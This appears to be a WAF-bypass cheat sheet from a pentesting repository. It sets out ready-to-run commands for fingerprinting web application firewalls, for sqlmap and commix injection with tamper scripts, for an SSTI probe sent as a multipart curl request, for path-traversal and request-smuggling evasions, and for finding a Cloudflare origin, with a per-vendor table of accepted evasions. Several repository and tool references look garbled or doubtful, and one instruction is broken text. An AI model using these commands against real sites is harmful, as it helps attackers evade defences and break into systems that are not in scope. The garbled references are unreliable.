# WAF Bypass Tools Collection (2026)
> **Author:** MD MAHABUBUR RAHMAN

Tooling to fingerprint WAFs, fuzz bypass encodings, and test evasions.
Payload ladders live in `universal-cheatsheet.txt` and `per-waf-payload-ladders.txt`.
Authorized targets only.

## 1. Fingerprint the WAF first (rule out guesswork)

```bash
# wafw00f (old but still the fastest detector)
wafw00f https://target.com -a
wafw00f https://target.com --findall

# WhatWaf (wordlist / cookie based detection)
whatwaf -u https://target.com --not-default
whatwaf -u https://target.com --wordlist /usr/share/wordlists/waf-tests.txt

# 0xacb / WAF-bypass-payload (payload sets per product)
git clone https://github.com/0xacb/recollapse.git
git clone https://github.com/h2w101/WAF-Bypass-Payloads.git

# nuclei - generic WAF detection
nuclei -u https://target.com -tags waf
```

## 2. Bypass fuzzers (encoding ladders)

```bash
# 0xacb's reCollapse - WAF bypass payload brute-forcer
python3 recollapse.py -u "https://target.com/" -d "q=PAYLOAD" -f payloads/sqi.txt

# There's a proven command auto-bypass in the Kali repo (comix/waf-bypass)
# see: https://github.com/kalil8/WAF-Bypass  (crowdsourced ladders)

# Single best manual loop (bash + ganagara-style normalizer)
# send the same payload once per encoding:
#  raw -> url -> double-url -> html-entities -> utf-7 -> chained null/newline
```

## 3. Per-vulnerability bypass wordlists (reuse these)

```bash
# SQLi
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
/usr/share/seclists/Fuzzing/SQLi/traversals-through-null-byte.txt
# XSS
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
# Command
/usr/share/seclists/Fuzzing/command-injection-commix-common.txt
# Path traversal
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
# SSTI: use the repo's SSTI/*.txt
```

## 4. Encoding helper tools (build your own ladders)

```bash
# commix - has a built-in "tamper" system for command injection WAFs
commix -u "https://target.com/?cmd=id" --tamper=space2comment

# Burp Extension: "WAF Detection" + "GeoIpWhois"
# Burp Intruder "copy with encoder" for url encode / double url encode

# SQLMap tamper scripts (ready-made evasions)
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,randomcase,equaltolike
sqlmap -u "https://target.com/?id=1" --tamper=between,bluecoat,modsecurityversioned
```

## 5. Protocol-level bypass (WAF doesn't see the app)

| Technique | Tool / check |
|-----------|--------------|
| HTTP Request Smuggling | `smuggler.py` (defparam), `xsmuggler`, Burp HTTP Smuggler ext |
| Host header / cache poisoning | `smuggler.py --scan`, manual `X-Forwarded-Scheme` tests |
| TE/CL confusion | `http-request-smuggler` burp ext |
| HTTP/1.0 downgrade | `curl --http1.0` manual |
| Path normalization | `curl --path-as-is` with `//`, `../`, `%2e%2e%2f`, `;`, `%00` |

## 6. When the WAF is Cloudflare specifically (common case)

```bash
# find origin behind CF
#  - shodan/censys search on SSL certs, mail headers, DNS history
#  - check for old origin subdomains: dev., staging., api., direct-*, lb-*
#  - ffuf the `X-Forwarded-Host` behavior of origin directly
# bypass on the app itself:
curl -X POST https://target.com/ \
  -H "Content-Type: multipart/form-data; boundary=----x" \
  --data-binary $'------x\r\nContent-Disposition: form-data; name="q"\r\n\r\n{{7*7}}\r\n------x--\r\n'
```

## 7. Quick "which evasion does this WAF accept" matrix

| WAF | Usually accepts | Usually blocks |
|-----|----------------|----------------|
| Cloudflare | newlines `%0a`, JSON body, oversized POST, path + `%2e` | `%00`, classic words |
| AWS WAF | multipart, whitespace-normalized SQL, comments | keywords in JSON |
| Akamai | header pad + lowercased versions | `union select` plain |
| ModSecurity | tab, `%u` decodes, comment fences | plain keywords, boundary |
| F5/ASM | unicode overlong, TE: chunked | null byte, body noise |
| Imperva | double-encoding of params, case mixing | obvious profile patterns |
| Sucuri | base64 in query, hex paths, `;` separators | plain `/etc/passwd` |
| Fastly | fragment `#`, case tricks | headers/bodies match rules |

## 8. Post bypass - validate you're really on the app (not a WAF page)

```bash
# compare full responses before/after a request that hits the WAF:
curl -s -o waf.html  -w "%{http_code} %{size_download}\n" "https://target.com/?q=<script>"
curl -s -o wf.x     -w "%{http_code} %{size_download}\n" "https://target.com/?q=X"
# WAF page = boilerplate HTML + error title; app page = your rendered template.
```

## 9. Golden rule

Fingerprint -> test one encoding layer at a time -> reply with 1 vary at a time
-> log which layer flipped the response. Script it. Do NOT brute a 100-layer
random combo; 2–3 stacked encodings is the realistic ceiling on production WAFs.
Only run against in-scope targets.
